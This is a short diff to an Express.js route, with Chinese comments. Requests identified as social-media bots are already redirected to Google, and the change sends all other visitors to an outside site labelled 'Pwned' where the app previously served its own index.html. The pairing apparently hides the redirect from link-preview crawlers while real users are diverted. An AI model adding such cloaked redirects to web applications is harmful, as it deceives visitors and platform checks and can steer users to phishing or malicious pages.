@@ -42,8 +42,8 @@ app.get('/', (req, res) => {
     // 如果是社交媒体平台的 bot 请求，重定向到 Google
     res.redirect('https://www.google.com/');
   } else {
-    // 如果不是社交媒体 bot 请求，发送 `index.html`
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+    // 如果不是社交媒体 bot 请求，重定向到 Pwned
+    res.redirect('https://pwned-4265.onrender.com');
   }
 });
 
